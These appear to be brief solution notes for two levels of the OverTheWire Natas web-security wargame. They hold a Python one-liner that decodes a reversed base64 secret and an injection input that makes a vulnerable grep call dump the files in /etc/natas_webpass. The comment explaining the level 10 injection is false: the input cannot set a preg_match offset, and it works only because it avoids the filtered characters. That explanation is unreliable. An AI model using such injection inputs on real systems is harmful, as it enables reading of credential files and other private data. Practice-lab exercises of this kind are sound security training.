# Level 8-> Level 9 ("input secret")
# http://natas8.natas.labs.overthewire.org/
# Get base64 string from hex "3d3d516343746d4d6d6c315669563362", reverse string, and decode to utf-8
import base64
base64.b64decode(bytearray.fromhex("3d3d516343746d4d6d6c315669563362").decode()[::-1]).decode()

# Level 10-> Level 11
# http://natas10.natas.labs.overthewire.org/
# Relevant server-side code: 
# if(preg_match('/[;|&]/',$key)) { print "Input contains an illegal character!"; } else { passthru("grep -i $key dictionary.txt"); }

# Since the preg_match method can take an offset as an optional argument,
# we can give the following input string ($key) to output the next level password:
# ".* /etc/natas_webpass/* , $matches, PREG_OFFSET_CAPTURE, -1"
# Due to setting the offset to -1, the server-side regex is only checked against the final character of the second argument.
